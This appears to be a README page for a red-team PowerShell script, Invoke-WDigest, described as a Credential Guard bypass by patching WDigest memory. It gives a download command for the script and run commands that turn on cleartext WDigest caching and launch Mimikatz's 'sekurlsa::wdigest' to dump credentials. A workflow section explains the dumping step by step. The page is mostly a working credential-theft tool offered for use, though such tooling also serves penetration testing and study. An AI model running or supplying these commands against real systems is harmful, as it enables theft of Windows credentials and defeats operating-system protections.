## Invoke-WDigest.ps1

|Script Name|Description|Privileges|Notes|
|---|---|---|---|
|[Invoke-WDigest](https://github.com/r00t-3xp10it/redpill/blob/main/lib/DeviceGuard/Invoke-WDigest.ps1)|Credential Guard Bypass Via Patching Wdigest Memory|Administrator|Credits: @wh0nsq, @BenjaminDelpy|

<br />

**download script:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/DeviceGuard/Invoke-WDigest.ps1" -OutFile "Invoke-WDigest.ps1"
```

<br />

**run cmdlet:**
```powershell
# Cmdlet help
Get-Help .\Invoke-WDigest.ps1 -full

# Execute Mimikatz (interactive shell) without WDigest caching
.\Invoke-WDigest.ps1 -wdigest 'false' -manycats

#  Ativate WDigest caching + Execute Mimikatz sekurlsa::wdigest exit
.\Invoke-WDigest.ps1 -wdigest 'true' -manycats


[FAST DEMONSTRATION]

## Ativate WDigest caching + dump created credential
.\Invoke-WDigest.ps1 -WDigest 'true' -manycats -runas

WORKFLOW
   - Invoke-WDigest.ps1 Ativates WDigest caching in memory
   - Invoke-WDigest.ps1 prompts user to enter credential to start cmd.exe
   - WDigest will store credential input by user in clear-text in memory
   - mimikatz will auto-execute 'sekurlsa::wdigest exit' to dump credentials

REMARK
   RunAs parameter switch exists for demonstration effects, and can not be
   used remotely because it requires target user interaction (prompt cred)
   and resource UserName password knowledge ..
```

<br />

![poc](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/DeviceGuard/Invoke-WDigest.png)

<br />

![poc](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/DeviceGuard/Invoke-WDigest2.png)
